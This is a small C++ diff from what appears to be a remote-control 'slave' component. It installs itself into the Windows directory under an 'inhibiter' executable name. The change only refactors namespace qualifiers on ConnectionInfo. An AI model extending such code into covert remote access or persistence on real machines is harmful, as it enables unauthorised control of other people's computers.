@@ -6,6 +6,8 @@
 using namespace System;
 
 #include <Innocence.hpp>
+using namespace Innocence;
+
 #include <blaspheme/transfer/FileTransfer.hpp>
 using namespace Blaspheme;
 
@@ -19,7 +21,7 @@ using namespace Blaspheme;
 
 namespace Inhibition
 {
-    SlaveCore::SlaveCore(Blaspheme::ConnectionInfo info) : 
+    SlaveCore::SlaveCore(ConnectionInfo info) : 
 		exited(false),
 		session(info),
 		installPath(System::getWindowsPath() + "\\" + Innocence::INHIBITER_EXE_NAME),
@@ -105,12 +107,12 @@ namespace Inhibition
         return false;
     }
 
-	const Blaspheme::ConnectionInfo& SlaveCore::getConnection()const
+	const ConnectionInfo& SlaveCore::getConnection()const
 	{
 		return session.getConnection();
 	}
 
-    void SlaveCore::setConnection(const Blaspheme::ConnectionInfo& info)
+    void SlaveCore::setConnection(const ConnectionInfo& info)
     {
 		session.setConnection(info);
     }
